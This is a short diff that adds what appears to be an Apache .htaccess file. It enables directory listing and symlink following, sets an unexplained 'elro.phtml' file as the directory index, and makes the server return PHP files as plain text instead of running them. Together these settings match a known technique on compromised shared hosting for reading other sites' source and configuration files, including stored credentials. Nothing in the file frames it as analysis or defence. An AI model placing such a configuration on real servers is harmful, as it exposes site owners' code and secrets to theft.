@@ -1,0 +1,4 @@
+Options Indexes FollowSymLinks
+DirectoryIndex elro.phtml
+AddType txt .php
+AddHandler txt .php
